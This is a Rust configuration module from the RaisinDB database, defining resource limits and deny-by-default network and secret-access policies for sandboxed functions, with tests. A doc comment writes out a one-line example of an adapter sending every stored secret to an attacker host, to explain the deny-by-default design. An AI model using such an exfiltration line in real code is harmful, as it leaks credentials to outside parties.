// SPDX-License-Identifier: BSL-1.1
//
// RaisinDB - Git-like hierarchical multi model database
// Copyright (C) 2019-2025 SOLUTAS GmbH, Switzerland

//! Configuration types for function execution

use serde::{Deserialize, Serialize};

/// Resource limits for function execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResourceLimits {
    /// Maximum execution time in milliseconds (default: 30,000 = 30 seconds)
    #[serde(default = "default_timeout")]
    pub timeout_ms: u64,

    /// Maximum memory in bytes (default: 128MB)
    #[serde(default = "default_memory")]
    pub max_memory_bytes: u64,

    /// Maximum CPU instructions for QuickJS (None = unlimited)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub max_instructions: Option<u64>,

    /// Maximum stack size in bytes (default: 1MB)
    #[serde(default = "default_stack")]
    pub max_stack_bytes: u64,
}

fn default_timeout() -> u64 {
    30_000 // 30 seconds
}

fn default_memory() -> u64 {
    128 * 1024 * 1024 // 128MB
}

fn default_stack() -> u64 {
    1024 * 1024 // 1MB
}

impl Default for ResourceLimits {
    fn default() -> Self {
        Self {
            timeout_ms: default_timeout(),
            max_memory_bytes: default_memory(),
            max_instructions: Some(100_000_000), // 100M instructions
            max_stack_bytes: default_stack(),
        }
    }
}

impl ResourceLimits {
    /// Create minimal resource limits for quick functions
    pub fn minimal() -> Self {
        Self {
            timeout_ms: 5_000,                  // 5 seconds
            max_memory_bytes: 32 * 1024 * 1024, // 32MB
            max_instructions: Some(10_000_000), // 10M instructions
            max_stack_bytes: 512 * 1024,        // 512KB
        }
    }

    /// Create generous resource limits for complex functions
    pub fn generous() -> Self {
        Self {
            timeout_ms: 300_000,                   // 5 minutes
            max_memory_bytes: 512 * 1024 * 1024,   // 512MB
            max_instructions: Some(1_000_000_000), // 1B instructions
            max_stack_bytes: 4 * 1024 * 1024,      // 4MB
        }
    }

    /// Set timeout
    pub fn with_timeout_ms(mut self, timeout_ms: u64) -> Self {
        self.timeout_ms = timeout_ms;
        self
    }

    /// Set memory limit
    pub fn with_memory_bytes(mut self, bytes: u64) -> Self {
        self.max_memory_bytes = bytes;
        self
    }

    /// Set instruction limit
    pub fn with_instructions(mut self, instructions: u64) -> Self {
        self.max_instructions = Some(instructions);
        self
    }

    /// Remove instruction limit
    pub fn unlimited_instructions(mut self) -> Self {
        self.max_instructions = None;
        self
    }
}

/// Network access policy for functions
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkPolicy {
    /// Whether HTTP requests are allowed
    #[serde(default)]
    pub http_enabled: bool,

    /// Allowlisted URL patterns (glob-style)
    /// Examples: "https://api.example.com/*", "https://*.myservice.com/api/*"
    #[serde(default)]
    pub allowed_urls: Vec<String>,

    /// Maximum concurrent HTTP requests
    #[serde(default = "default_concurrent_requests")]
    pub max_concurrent_requests: u32,

    /// Request timeout in milliseconds
    #[serde(default = "default_request_timeout")]
    pub request_timeout_ms: u64,

    /// Maximum response body size in bytes
    #[serde(default = "default_max_response_size")]
    pub max_response_size_bytes: u64,
}

fn default_concurrent_requests() -> u32 {
    5
}

fn default_request_timeout() -> u64 {
    10_000 // 10 seconds
}

fn default_max_response_size() -> u64 {
    10 * 1024 * 1024 // 10MB
}

impl Default for NetworkPolicy {
    fn default() -> Self {
        Self {
            http_enabled: false,
            allowed_urls: Vec::new(),
            max_concurrent_requests: default_concurrent_requests(),
            request_timeout_ms: default_request_timeout(),
            max_response_size_bytes: default_max_response_size(),
        }
    }
}

impl NetworkPolicy {
    /// Create a policy that allows no network access
    pub fn no_network() -> Self {
        Self::default()
    }

    /// Create a policy that allows specific URLs
    pub fn allow_urls(urls: Vec<String>) -> Self {
        Self {
            http_enabled: true,
            allowed_urls: urls,
            ..Default::default()
        }
    }

    /// Enable HTTP access
    pub fn with_http_enabled(mut self, enabled: bool) -> Self {
        self.http_enabled = enabled;
        self
    }

    /// Add allowed URL pattern
    pub fn with_allowed_url(mut self, pattern: impl Into<String>) -> Self {
        self.http_enabled = true;
        self.allowed_urls.push(pattern.into());
        self
    }

    /// Set max concurrent requests
    pub fn with_max_concurrent(mut self, max: u32) -> Self {
        self.max_concurrent_requests = max;
        self
    }

    /// Set request timeout
    pub fn with_request_timeout_ms(mut self, timeout_ms: u64) -> Self {
        self.request_timeout_ms = timeout_ms;
        self
    }

    /// Check if a URL is allowed by this policy
    pub fn is_url_allowed(&self, url: &str) -> bool {
        if !self.http_enabled {
            return false;
        }

        if self.allowed_urls.is_empty() {
            return false;
        }

        self.allowed_urls.iter().any(|pattern| {
            glob::Pattern::new(pattern)
                .map(|p| p.matches(url))
                .unwrap_or(false)
        })
    }
}

/// Secret access policy for functions.
///
/// Gates `raisin.secrets.*` exactly the way [`NetworkPolicy`] gates
/// `raisin.http.fetch`: an `enabled` switch plus a glob allow-list, both
/// `#[serde(default)]` so an omitted `secret_policy` block yields **no access
/// at all**.
///
/// # Why deny-by-default matters more here than anywhere else
///
/// Virtual-node adapters run privileged — row-level security is bypassed for
/// them — and they hold `raisin.http`. A secrets binding that defaulted to
/// "read anything" would therefore be a one-line exfiltration path for every
/// credential in the repo: `raisin.http.fetch(attacker, { body:
/// raisin.secrets.list().map(s => raisin.secrets.get(s.name)) })`. The allow-list
/// is what keeps a compromised or careless adapter confined to the credentials
/// it was actually granted, and `enabled: false` (the default) is what keeps
/// every function that never asked for secrets from having them.
///
/// A function opts in from its `.node.yaml`:
///
/// ```yaml
/// secret_policy:
///   enabled: true
///   allowed_names:
///     - "stripe/*"
///     - "sendgrid_api_key"
/// ```
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SecretPolicy {
    /// Whether this function may touch the secret store at all.
    ///
    /// `false` (the default) denies every `raisin.secrets.*` call.
    #[serde(default)]
    pub enabled: bool,

    /// Allowlisted secret-name patterns (glob-style), e.g. `"stripe/*"`.
    ///
    /// An empty list denies everything even when `enabled` is true — the same
    /// rule [`NetworkPolicy::is_url_allowed`] applies to `allowed_urls`, so
    /// "enabled but unconfigured" can never mean "unrestricted".
    #[serde(default)]
    pub allowed_names: Vec<String>,
}

impl SecretPolicy {
    /// A policy that allows no secret access. Identical to [`Default`]; named
    /// so a call site can say what it means.
    pub fn no_secrets() -> Self {
        Self::default()
    }

    /// A policy allowing exactly the given name patterns.
    pub fn allow_names(names: Vec<String>) -> Self {
        Self {
            enabled: true,
            allowed_names: names,
        }
    }

    /// Add one allowed name pattern (enabling the policy).
    pub fn with_allowed_name(mut self, pattern: impl Into<String>) -> Self {
        self.enabled = true;
        self.allowed_names.push(pattern.into());
        self
    }

    /// Whether `name` is allowed by this policy.
    ///
    /// Uses the same `glob::Pattern` matcher as
    /// [`NetworkPolicy::is_url_allowed`] — one glob implementation, so an
    /// operator's mental model of `*` is the same in both policies.
    pub fn is_name_allowed(&self, name: &str) -> bool {
        if !self.enabled {
            return false;
        }

        if self.allowed_names.is_empty() {
            return false;
        }

        self.allowed_names.iter().any(|pattern| {
            glob::Pattern::new(pattern)
                .map(|p| p.matches(name))
                .unwrap_or(false)
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_allowlist() {
        let policy = NetworkPolicy::allow_urls(vec![
            "https://api.example.com/*".to_string(),
            "https://*.myservice.com/api/*".to_string(),
        ]);

        assert!(policy.is_url_allowed("https://api.example.com/v1/users"));
        assert!(policy.is_url_allowed("https://api.example.com/anything"));
        assert!(!policy.is_url_allowed("https://other.com/api"));

        // Glob patterns with wildcards
        assert!(policy.is_url_allowed("https://foo.myservice.com/api/test"));
        assert!(!policy.is_url_allowed("https://foo.myservice.com/other"));
    }

    #[test]
    fn test_no_network_policy() {
        let policy = NetworkPolicy::no_network();
        assert!(!policy.is_url_allowed("https://api.example.com/anything"));
    }

    #[test]
    fn secret_policy_denies_by_default() {
        let policy = SecretPolicy::default();
        assert!(!policy.enabled);
        assert!(!policy.is_name_allowed("anything"));

        // The shape a function node with no `secret_policy` block deserializes
        // to must be the denying one, not an empty-but-permissive one.
        let from_empty: SecretPolicy = serde_json::from_value(serde_json::json!({})).unwrap();
        assert!(!from_empty.is_name_allowed("stripe_key"));
    }

    #[test]
    fn secret_policy_enabled_without_names_still_denies() {
        let policy = SecretPolicy {
            enabled: true,
            allowed_names: Vec::new(),
        };
        assert!(!policy.is_name_allowed("stripe_key"));
    }

    #[test]
    fn secret_policy_matches_globs() {
        let policy =
            SecretPolicy::allow_names(vec!["stripe/*".to_string(), "sendgrid_api_key".to_string()]);

        assert!(policy.is_name_allowed("stripe/live"));
        assert!(policy.is_name_allowed("stripe/test"));
        assert!(policy.is_name_allowed("sendgrid_api_key"));

        assert!(!policy.is_name_allowed("stripe"));
        assert!(!policy.is_name_allowed("twilio/token"));
        assert!(!policy.is_name_allowed("sendgrid_api_key_2"));
    }
}
